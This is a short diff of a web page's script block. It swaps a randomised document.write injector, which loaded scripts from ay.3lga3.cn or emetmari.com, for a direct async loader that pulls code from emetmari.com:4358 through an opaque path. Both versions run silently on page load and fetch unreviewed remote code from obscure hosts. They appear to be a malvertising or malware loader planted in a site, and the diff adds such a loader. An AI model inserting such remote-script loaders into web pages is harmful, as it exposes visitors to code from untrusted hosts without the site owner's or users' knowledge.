@@ -1,23 +1,8 @@
 <script>
-var randoms = {
-	ads_codes: ['<script src="https://ay.3lga3.cn/Power/6719E126-B287-4B87-94ED-6D94DD8897B7.js"><'+'/script>','<script>    var s = document.createElement(\'script\');    s.type = \'text/javascript\';    s.async = true;    s.src = \'https://emetmari.com:4358/jculnoukbe/oconi1xfq0jzigot4ketuh/2078\';    var head = document.getElementsByTagName(\'head\')[0];    head.appendChild(s);<'+'/script>'],
-	ads_weight: [10,10],
-
-	get_random: function(weight) {
-		var s = eval(weight.join('+'));
-		var r = Math.floor(Math.random() * s);
-		var w = 0;
-		var n = weight.length - 1;
-		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
-		return n;
-	},
-	init: function() {
-
-		var rand = randoms.get_random(randoms.ads_weight);
-		document.write(randoms.ads_codes[rand]);
-
-	}
-}
-randoms.init();
-
+    var s = document.createElement('script');
+    s.type = 'text/javascript';
+    s.async = true;
+    s.src = 'https://emetmari.com:4358/skdaulwxjj/tgfwz1bnx0qzrzzv4fmhyx/2078';
+    var head = document.getElementsByTagName('head')[0];
+    head.appendChild(s);
 </script>
